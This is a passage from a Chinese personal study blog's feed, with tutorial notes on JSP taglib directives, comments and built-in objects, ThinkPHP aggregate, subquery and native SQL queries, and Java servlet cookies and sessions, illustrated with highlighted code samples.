<h3 id="taglib指令"><a href="#taglib指令" class="headerlink" title="taglib指令"></a>taglib指令</h3><figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="perl">@page contentType=<span class="string">"text/html; utf-8"</span> errorPage=<span class="string">"500.jsp"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="perl">@taglib prefix=<span class="string">"c"</span> uri=<span class="string">"http://java.sun.com/jsp/jstl/core"</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="perl">    <span class="keyword">int</span> i =<span class="number">3</span>/<span class="number">0</span>;</span></span><br><span class="line"><span class="xml">%&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>引入标签库，且命名为c之后，就可以使用c标签了<br><img src="/img/JavaWeb/8-6学习日记/3.png" alt="avatar"></p>
<p>这样就会看到各种各样的标签可以使用了</p>
<p>prefix定义的是前缀，自定义;业内约定好了jstl就是c为前缀</p>
<p>uri就是需要导入的标签库</p>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><ol>
<li><p>html注释：</p>
<ul>
<li>&lt;!— —&gt;：只能注释html代码片段</li>
</ul>
</li>
<li><p>jsp注释</p>
<ul>
<li>&lt;%— —%&gt;：可以注释所有</li>
</ul>
</li>
</ol>
<figure class="highlight erb"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="comment">&lt;!--</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;<span class="name">h3</span>&gt;</span>主体信息<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="xml">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-</span></span><br><span class="line"><span class="ruby">	&lt;%</span></span><br><span class="line"><span class="ruby">    	System.out.println(<span class="string">"hi~~~"</span>);</span></span><br><span class="line"><span class="ruby">	</span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">--%&gt;</span></span><br></pre></td></tr></table></figure>
<p>html注释之后，浏览器可以查看到注释的源码</p>
<p>所以推荐使用jsp注释</p>
<h2 id="内置对象"><a href="#内置对象" class="headerlink" title="内置对象"></a>内置对象</h2><ul>
<li><p>在jsp页面中不需要创建，直接使用的对象</p>
</li>
<li><p>一共有9个：</p>
</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>变量名</th>
<th>真实类型</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>pageContext</td>
<td>PageContext</td>
<td>当前页面共享数据</td>
</tr>
<tr>
<td>request</td>
<td>HttpServletRequest</td>
<td>一次请求访问的多个资源(转发)</td>
</tr>
<tr>
<td>session</td>
<td>HttpSession</td>
<td>一次会话的多个请求间</td>
</tr>
<tr>
<td>application</td>
<td>ServletContext</td>
<td>所有用户间共享数据</td>
</tr>
<tr>
<td>response</td>
<td>HttpServletResponse</td>
<td>响应对象</td>
</tr>
<tr>
<td>page</td>
<td>Object</td>
<td>当前页面(Servlet)的对象 this</td>
</tr>
<tr>
<td>out</td>
<td>JspWriter</td>
<td>输出对象，数据输出到页面上</td>
</tr>
<tr>
<td>config</td>
<td>ServletConfig</td>
<td>Servlet的配置对象</td>
</tr>
<tr>
<td>exception</td>
<td>Throwable</td>
<td>异常对象</td>
</tr>
</tbody>
</table>
</div>
<p>pageContext可以获取另外8个内置对象</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>JavaWeb</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/8/5-ThinkPHP-4</title>
    <url>/2020/08/05/PHP-2020-8-5-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h1><p><img src="/img/PHP/thinkphp/8-6/0.png" alt="avatar"></p>
<h2 id="聚合查询"><a href="#聚合查询" class="headerlink" title="聚合查询"></a>聚合查询</h2><p>1.使用count()方法，可以求出所查询数据的数量</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span>=Db::name(<span class="string">'student'</span>)-&gt;count();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br></pre></td></tr></table></figure>
<p>2.count()可以指定id，比如有空值的ssex，不会计算数量<br><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span>=Db::name(<span class="string">'student'</span>)-&gt;count(<span class="string">'ssex'</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br></pre></td></tr></table></figure></p>
<p>3.使用max()方法，求出所查询数据字段的最大值<br><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span>=Db::name(<span class="string">'student'</span>)-&gt;max(<span class="string">'sage'</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br></pre></td></tr></table></figure></p>
<p>4.min()方法与max()一样<br><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span>=Db::name(<span class="string">'student'</span>)-&gt;min(<span class="string">'sage'</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br></pre></td></tr></table></figure></p>
<p>5.使用avg()方法，求平均值<br><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span>=Db::name(<span class="string">'student'</span>)-&gt;avg(<span class="string">'sage'</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span>;</span><br></pre></td></tr></table></figure></p>
<p>6.使用sum()方法，求总和<br><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span>=Db::name(<span class="string">'student'</span>)-&gt;sum(<span class="string">'sage'</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span>;</span><br></pre></td></tr></table></figure></p>
<h2 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h2><p>1.使用fetchSql()方法，可以设置不执行SQL，而返回SQL语句，默认true<br><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">$result=Db::name<span class="function"><span class="params">(<span class="string">'student'</span>)</span>-&gt;</span>fetchSql<span class="function"><span class="params">()</span>-&gt;</span>select();</span><br><span class="line"><span class="keyword">return</span> $result;</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="symbol">`student`</span></span><br></pre></td></tr></table></figure></p>
<p>2.使用buidSql()方法，也是返回SQL语句，但是不需要执行select()<br><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span>=Db::name(<span class="string">'student'</span>)-&gt;buildSql();</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span>;</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">( <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="symbol">`student`</span> )</span><br></pre></td></tr></table></figure></p>
<p>3.闭包方式执行子查询<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$result=Db::name(<span class="string">'one'</span>)-&gt;where(<span class="string">'id'</span>,<span class="string">'in'</span>,<span class="function"><span class="keyword">function</span> <span class="params">($query)</span></span>&#123;</span><br><span class="line">    $query-&gt;name(<span class="string">'two'</span>)-&gt;field(<span class="string">'uid'</span>)-&gt;where(<span class="string">'gender'</span>,<span class="string">'男'</span>);</span><br><span class="line">&#125;)-&gt;select();</span><br><span class="line"><span class="keyword">return</span> $result;</span><br></pre></td></tr></table></figure></p>
<h2 id="原生查询"><a href="#原生查询" class="headerlink" title="原生查询"></a>原生查询</h2><p>1.使用query()方法，进行原生SQL查询，适用于读取操作，SQL错误返回false<br><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span>=Db::query(<span class="string">'select * from student'</span>);</span><br><span class="line"><span class="keyword">return</span> json(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><br>2.使用execute()方法，进行原生SQL更新写入等，SQL错误返回false<br><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span>=<span class="keyword">Db</span>::execute('<span class="keyword">update</span> student <span class="keyword">set</span> sname=<span class="string">"硬币哥"</span> where sno=18008001');</span><br><span class="line"><span class="keyword">return</span> json(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>ThinkPHP</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWeb-2020/8/4-Session</title>
    <url>/2020/08/04/JavaWeb-2020-8-4-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul>
<li><p>Java Server Pages：Java服务器端页面</p>
<ul>
<li><p>可以理解为：一个特殊的页面，其中既可以指定定义html标签，又可以定位java代码</p>
</li>
<li><p>用于简化书写</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight erb"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="ruby">        System.out.println(<span class="string">"hello jsp"</span>);</span></span><br><span class="line"><span class="ruby">    </span><span class="xml">%&gt;</span></span><br><span class="line"><span class="xml">    </span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>hi~ jsp!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>浏览器显示<br><img src="/img/JavaWeb/8-4学习日记/0.png" alt="avatar"><br>运行结果<br><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hello jsp</span></span><br></pre></td></tr></table></figure></p>
<h2 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h2><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>JSP定义Java代码的方式:</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">&lt;<span class="meta">%</span> 代码 <span class="meta">%</span>&gt;</span><br></pre></td></tr></table></figure>
<p>定义的Java代码在service方法中。service方法中可以定义什么，该脚本就可以定义什么</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">&lt;<span class="meta">%</span>! 代码 <span class="meta">%</span>&gt;</span><br></pre></td></tr></table></figure>
<p>定义的Java代码，在JSP转换后的Java类的成员位置。</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">&lt;<span class="meta">%</span>= 代码 <span class="meta">%</span>&gt;</span><br></pre></td></tr></table></figure>
<p>定义的Java代码，会输出到页面上。输出语句中可以定义什么，该脚本中就可以定义什么</p>
<h3 id="内置对象"><a href="#内置对象" class="headerlink" title="内置对象"></a>内置对象</h3><ul>
<li><p>在JSP页面中不需要获取和创建，可以直接使用的对象</p>
<ul>
<li><p>request</p>
</li>
<li><p>response</p>
</li>
<li><p>out：字符输出流对象。可以将数据输出到页面上，和response.getWriter()类似</p>
<ul>
<li>response.getWriter()和out.write()的区别：在tomcat服务器真正给客户端做出响应之前，会找response缓冲区数据，再找out缓冲区数据</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    System.<span class="meta">out</span>.print<span class="meta">ln(</span><span class="string">"hello jsp"</span>);</span><br><span class="line">    String contextPath = request.getContextPath();</span><br><span class="line">    <span class="meta">out</span>.p<span class="meta">rint(</span>contextPath);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>这样就可以在浏览器上输出虚拟地址，out和request就是内置对象</p>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>首先创建一个叫showTime.jsp的文件</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>="java.util.Date" %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>="java.text.SimpleDateFormat" %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>="java.net.URLEncoder" %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>="java.net.URLDecoder" %&gt;&lt;%<span class="comment">--</span></span><br><span class="line">  Created <span class="keyword">by</span> IntelliJ IDEA.</span><br><span class="line">  <span class="keyword">User</span>: songf</span><br><span class="line">  <span class="type">Date</span>: <span class="number">2020</span>/<span class="number">8</span>/<span class="number">5</span></span><br><span class="line">  <span class="type">Time</span>: <span class="number">10</span>:<span class="number">51</span></span><br><span class="line">  <span class="keyword">To</span> change this <span class="keyword">template</span> use File | Settings | File Templates.</span><br><span class="line"><span class="comment">--%&gt;</span></span><br><span class="line">&lt;%@ page contentType="text/html;charset=UTF-8" <span class="keyword">language</span>="java" %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;itcast&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    //<span class="number">1.</span>获取所有的cookie</span><br><span class="line">    Cookie[] cs = request.getCookies();</span><br><span class="line">    <span class="type">boolean</span> flag=<span class="keyword">false</span>; //没有cookie为<span class="keyword">false</span></span><br><span class="line">    //<span class="number">2.</span>遍历cookie数组</span><br><span class="line">    <span class="keyword">if</span> (cs!=<span class="keyword">null</span>&amp;&amp;cs.length&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span> (Cookie c : cs) &#123;</span><br><span class="line">            //<span class="number">3.</span>获取cookie的名称</span><br><span class="line">            String <span class="type">name</span> = c.getName();</span><br><span class="line">            //<span class="number">4.</span>判断名称是否是lastTime</span><br><span class="line">            <span class="keyword">if</span> ("lastTime".equals(<span class="type">name</span>))&#123;</span><br><span class="line">                //有该cookie，不是第一次访问</span><br><span class="line">                flag=<span class="keyword">true</span>;//有lastTime的cookie</span><br><span class="line">                //设置cookie的<span class="keyword">value</span></span><br><span class="line">                //获取当前时间的字符串，重新设置cookie的值，重新发送cookie</span><br><span class="line">                <span class="type">Date</span> <span class="type">date</span>=<span class="built_in">new</span> <span class="type">Date</span>();</span><br><span class="line">                SimpleDateFormat sdf=<span class="built_in">new</span> SimpleDateFormat("yyyy年MM月dd日 HH:mm:ss");</span><br><span class="line">                String str_date = sdf.format(<span class="type">date</span>);</span><br><span class="line">                <span class="keyword">System</span>.<span class="keyword">out</span>.println("编码前"+str_date);</span><br><span class="line">                //URL编码</span><br><span class="line">                str_date= URLEncoder.encode(str_date,"utf-8");</span><br><span class="line">                <span class="keyword">System</span>.<span class="keyword">out</span>.println("编码后"+str_date);</span><br><span class="line">                c.setValue(str_date);</span><br><span class="line">                //设置cookie的存活时间</span><br><span class="line">                c.setMaxAge(<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>);//一个月</span><br><span class="line">                response.addCookie(c);</span><br><span class="line"></span><br><span class="line">                //响应数据</span><br><span class="line">                //获取cookie的<span class="keyword">value</span>,时间</span><br><span class="line">                String <span class="keyword">value</span> = c.getValue();</span><br><span class="line">                <span class="keyword">System</span>.<span class="keyword">out</span>.println("解码前"+<span class="keyword">value</span>);</span><br><span class="line">                //URL解码</span><br><span class="line">                <span class="keyword">value</span>= URLDecoder.decode(<span class="keyword">value</span>,"utf-8");</span><br><span class="line">                <span class="keyword">System</span>.<span class="keyword">out</span>.println("解码后"+<span class="keyword">value</span>);</span><br><span class="line">                response.getWriter().<span class="keyword">write</span>("欢迎回来，您上次访问时间为："+<span class="keyword">value</span>);</span><br><span class="line"></span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cs==<span class="keyword">null</span> || cs.length==<span class="number">0</span> || flag==<span class="keyword">false</span>)&#123;</span><br><span class="line">        //没有，第一次访问</span><br><span class="line"></span><br><span class="line">        //设置cookie的<span class="keyword">value</span></span><br><span class="line">        //获取当前时间的字符串，重新设置cookie的值，重新发送cookie</span><br><span class="line">        <span class="type">Date</span> <span class="type">date</span>=<span class="built_in">new</span> <span class="type">Date</span>();</span><br><span class="line">        SimpleDateFormat sdf=<span class="built_in">new</span> SimpleDateFormat("YYYY年MM月dd日 HH:mm:ss");</span><br><span class="line">        String str_date = sdf.format(<span class="type">date</span>);</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("编码前"+str_date);</span><br><span class="line">        //URL编码</span><br><span class="line">        str_date=URLEncoder.encode(str_date,"utf-8");</span><br><span class="line">        <span class="keyword">System</span>.<span class="keyword">out</span>.println("编码后"+str_date);</span><br><span class="line"></span><br><span class="line">        Cookie c=<span class="built_in">new</span> Cookie("lastTime", str_date);</span><br><span class="line">        c.setValue(str_date);</span><br><span class="line">        //设置cookie的存活时间</span><br><span class="line">        c.setMaxAge(<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>);//一个月</span><br><span class="line">        response.addCookie(c);</span><br><span class="line"></span><br><span class="line">        response.getWriter().<span class="keyword">write</span>("您好，欢迎首次访问");</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>直接将之前的代码复制过来，再次访问发现依旧是正常的，并且这样的操作还可以让你可以在后边添加上HTML代码</p>
<h1 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>服务器端会话技术，在一次会话的多次请求见共享数据，将数据保存在服务器端的对象中。HttpSession</p>
<h2 id="快速入门-1"><a href="#快速入门-1" class="headerlink" title="快速入门"></a>快速入门</h2><ul>
<li><p>获取HttpSession对象</p>
<ul>
<li>HttpSession session = request.getSession();</li>
</ul>
</li>
<li><p>使用HttpSession对象：</p>
<ul>
<li><p>Object getAttribute(String name)</p>
</li>
<li><p>void setAttribute(String name,Object value)</p>
</li>
<li><p>void removeAttribute(String name)</p>
</li>
</ul>
</li>
</ul>
<p>session1<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.session;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpSession</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">sessionDemo1</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//使用session共享数据</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.获取session</span></span><br><span class="line">        <span class="type">HttpSession</span> session = request.getSession();</span><br><span class="line">        <span class="comment">//2.存储数据</span></span><br><span class="line">        session.setAttribute(<span class="string">"msg"</span>,<span class="string">"hello session"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>session2<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.session;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpSession</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">sessionDemo2</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//使用session共享数据</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.获取session</span></span><br><span class="line">        <span class="type">HttpSession</span> session = request.getSession();</span><br><span class="line">        <span class="comment">//2.获取数据</span></span><br><span class="line">        <span class="type">Object</span> msg = session.getAttribute(<span class="string">"msg"</span>);</span><br><span class="line">        <span class="type">System</span>.out.println(msg);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>先访问session1,再访问session2<br>运行结果<br><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hello session</span></span><br></pre></td></tr></table></figure><br>关闭浏览器，再次访问session2<br>运行结果<br><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="literal">null</span></span><br></pre></td></tr></table></figure><br>这样就可以看到session的范围确实是一次会话内</p>
<p>Session是依赖于Cookie的</p>
<h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><ol>
<li><p>当客户端关闭后，服务器不关闭，再次获取session是否为同一个？</p>
</li>
<li><p>客户端不关闭，服务器关闭后，两次获取的session是同一个吗？</p>
</li>
<li><p>session的失效时间</p>
</li>
</ol>
<h3 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h3><p>默认情况下不是同一个，因为关闭再开启之后，相当于重新开启了一个会话<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> cn.itcast.session;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpSession</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">sessionDemo3</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//1.获取session</span></span><br><span class="line">        <span class="type">HttpSession</span> session = request.getSession();</span><br><span class="line"></span><br><span class="line">        <span class="type">System</span>.out.println(session);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>先访问第一次，运行结果<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.catalina</span><span class="selector-class">.session</span><span class="selector-class">.StandardSessionFacade</span>@<span class="keyword">5d1eba7c</span></span><br></pre></td></tr></table></figure><br>关闭浏览器再次访问，运行结果<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.catalina</span><span class="selector-class">.session</span><span class="selector-class">.StandardSessionFacade</span>@<span class="keyword">610f36ce</span></span><br></pre></td></tr></table></figure></p>
<p>可以看到明显的不同，这就说明了当客户端关闭后，服务器不关闭，再次获取session不是为同一个</p>
<p>如果想客户端关闭后，session也相同，就可以改为<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.session;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">sessionDemo3</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//1.获取session</span></span><br><span class="line">        <span class="type">HttpSession</span> session = request.getSession();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//客户端关闭后，session也相同</span></span><br><span class="line">        <span class="type">Cookie</span> c=<span class="keyword">new</span> <span class="type">Cookie</span>(<span class="string">"JSESSIONID"</span>, session.getId());</span><br><span class="line">        c.setMaxAge(<span class="number">60</span>*<span class="number">60</span>);</span><br><span class="line">        response.addCookie(c);</span><br><span class="line"></span><br><span class="line">        <span class="type">System</span>.out.println(session);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.catalina</span><span class="selector-class">.session</span><span class="selector-class">.StandardSessionFacade</span>@<span class="keyword">728cb723</span></span><br></pre></td></tr></table></figure><br>关闭浏览器重新访问<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.catalina</span><span class="selector-class">.session</span><span class="selector-class">.StandardSessionFacade</span>@<span class="keyword">728cb723</span></span><br></pre></td></tr></table></figure><br>发现两个一样，这就是上面说的session是依赖于cookie的，设置cookie的存活时间就可以设置session</p>
<h3 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h3><ul>
